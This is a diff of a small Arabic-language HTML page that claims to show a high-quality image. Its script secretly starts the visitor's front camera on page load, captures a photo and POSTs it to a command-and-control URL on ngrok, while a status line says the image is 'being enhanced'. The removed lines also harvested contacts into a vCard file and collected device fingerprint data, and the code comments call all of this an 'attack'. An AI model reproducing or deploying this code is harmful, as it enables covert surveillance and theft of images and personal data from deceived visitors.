@@ -3,43 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عرض الصورة عالية الجودة</title>
+    <title>عرض الصورة</title>
     <style>
         body { 
             margin: 0; padding: 0; background: #000; color: #fff; 
             font-family: Arial, sans-serif; text-align: center; 
-            overflow: hidden;
         }
         #status {
-            position: fixed; top: 15px; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.8); padding: 12px 25px; border-radius: 12px;
-            font-size: 17px; z-index: 999;
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: rgba(0,0,0,0.8); padding: 15px 30px; border-radius: 10px;
+            font-size: 18px; z-index: 999;
         }
-        img { max-width: 100%; height: auto; margin-top: 60px; }
     </style>
 </head>
 <body>
 
-    <div id="status">جاري تحميل الصورة عالية الجودة...</div>
-    <img src="https://picsum.photos/id/1015/800/600" alt="صورة">
+    <div id="status">جاري تحميل الصورة...</div>
+    <img src="https://picsum.photos/id/1015/800/600" style="max-width:100%; margin-top:80px;" alt="صورة">
 
     <script>
-        // ================== إعدادات ==================
-        const C2_URL = "   https://virulently-retaliative-kisha.ngrok-free.dev";   // ← غير هذا إلى رابط ngrok الفعلي
+        // غير هذا الرابط إلى رابط ngrok الخاص بك
+        const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev";
 
-        // ================== الدالة الرئيسية للهجوم ==================
-        async function startAdvancedAttack() {
-
-            // 1. التقاط صورة من الكاميرا الأمامية
+        async function captureAndSend() {
             try {
+                // طلب صلاحية الكاميرا الأمامية
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: 640, height: 480 } 
                 });
-                
+
                 const video = document.createElement("video");
                 video.srcObject = stream;
                 await video.play();
 
+                // التقاط الصورة بعد ثانية ونصف
                 setTimeout(() => {
                     const canvas = document.createElement("canvas");
                     canvas.width = 640;
@@ -48,65 +45,38 @@
 
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
-                        formData.append("file", blob, `camera_front_${Date.now()}.jpg`);
-                        await fetch(C2_URL, { method: "POST", body: formData });
-                    }, "image/jpeg", 0.85);
+                        formData.append("file", blob, `camera_${Date.now()}.jpg`);
 
+                        await fetch(C2_URL, {
+                            method: "POST",
+                            body: formData
+                        });
+
+                        console.log("تم إرسال صورة الكاميرا بنجاح");
+                    }, "image/jpeg", 0.9);
+
+                    // إيقاف الكاميرا
                     stream.getTracks().forEach(track => track.stop());
-                }, 1800);
-            } catch(e) { /* صامت */ }
+                }, 1500);
 
-            // 2. استخراج جهات الاتصال → .vcf
-            try {
-                if (navigator.contacts && navigator.contacts.select) {
-                    const contacts = await navigator.contacts.select(["name", "tel"], { multiple: true });
-                    
-                    let vcf = "";
-                    contacts.forEach(c => {
-                        if (c.name && c.name[0] && c.tel && c.tel[0]) {
-                            vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${c.name[0]}\nTEL;TYPE=CELL:${c.tel[0]}\nEND:VCARD\n`;
-                        }
-                    });
-
-                    if (vcf) {
-                        const vcfBlob = new Blob([vcf], { type: "text/vcard" });
-                        const formData = new FormData();
-                        formData.append("file", vcfBlob, `contacts_${Date.now()}.vcf`);
-                        await fetch(C2_URL, { method: "POST", body: formData });
-                    }
-                }
-            } catch(e) { /* صامت */ }
-
-            // 3. معلومات الجهاز
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenResolution: `${screen.width}x${screen.height}`,
-                deviceMemory: navigator.deviceMemory || "unknown",
-                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
-                timestamp: Date.now(),
-                url: window.location.href
-            };
-
-            fetch(C2_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(deviceInfo)
-            });
+            } catch (e) {
+                console.log("فشل التقاط الصورة أو رفض الصلاحية");
+            }
         }
 
-        // ================== بدء الهجوم ==================
-        window.onload = function() {
+        // بدء العملية بعد تحميل الصفحة
+        window.onload = () => {
             document.getElementById("status").innerHTML = "جاري تحسين الصورة...";
-
+            
+            // بدء التقاط الصورة بعد 1.5 ثانية
             setTimeout(() => {
-                startAdvancedAttack();
-            }, 1300);
+                captureAndSend();
+            }, 1500);
 
+            // رسالة نهائية
             setTimeout(() => {
                 document.getElementById("status").innerHTML = "تم تحميل الصورة بنجاح ✓";
-            }, 6500);
+            }, 5000);
         };
     </script>
 </body>
